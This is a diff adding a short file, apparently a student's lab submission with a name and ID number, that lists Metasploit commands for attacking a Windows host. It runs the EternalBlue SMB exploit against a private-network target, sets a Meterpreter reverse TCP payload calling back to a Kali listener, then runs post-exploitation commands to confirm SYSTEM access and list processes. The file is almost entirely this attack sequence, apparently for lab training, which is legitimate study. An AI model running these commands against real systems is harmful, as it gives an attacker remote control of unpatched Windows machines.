@@ -1,0 +1,30 @@
+lyba Kamran
+241554461
+
+
+
+//COMMANDS USED
+
+# Using the EternalBlue exploit
+use exploit/windows/smb/ms17_010_eternalblue
+
+# Seting the target IP address
+set RHOSTS 192.168.56.101
+
+# Seting the payload (Meterpreter reverse TCP)
+set PAYLOAD windows/x64/meterpreter/reverse_tcp
+
+# Set your listener IP address (Kali IP)
+set LHOST 192.168.56.102
+
+# Run the exploit to trigger the attack
+exploit
+
+# After successful exploitation, gather system information
+sysinfo
+
+# Get the current user to verify SYSTEM access
+getuid
+
+# List all running processes on the target system
+ps
